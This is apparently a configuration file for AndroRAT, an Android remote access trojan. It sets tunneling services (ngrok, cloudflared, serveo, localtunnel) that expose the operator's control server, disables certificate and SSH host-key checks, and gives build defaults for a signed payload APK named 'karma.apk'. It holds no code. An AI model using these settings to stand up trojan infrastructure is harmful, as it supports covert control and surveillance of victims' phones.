# AndroRAT Configuration File
# Configure tunneling preferences and settings

[tunneling]
# Preferred tunneling service (auto, cloudflared, serveo, localtunnel, ngrok)
preferred_service = auto

# Fallback services in order of preference
fallback_services = cloudflared,serveo,localtunnel,ngrok

# Timeout for tunnel establishment (seconds)
tunnel_timeout = 30

# Retry attempts for failed tunnels
max_retries = 3

[ngrok]
# Ngrok settings (requires pyngrok installed)
tcp_enabled = true
auth_token = 

[cloudflared]
# Cloudflare Tunnel settings
auto_install = true
tunnel_name = androrat-tunnel

[serveo]
# Serveo SSH tunnel settings
subdomain_prefix = androrat
ssh_options = -o StrictHostKeyChecking=no

[localtunnel]
# LocalTunnel settings (requires npm and localtunnel package)
auto_install = true
subdomain = 

[ssl]
# SSL certificate handling
verify_certificates = false
ignore_certificate_errors = true

[build]
# Default build settings
default_port = 8000
default_output = karma.apk
auto_sign = true

[gui]
# GUI preferences
theme = default
log_level = info
auto_clear_logs = false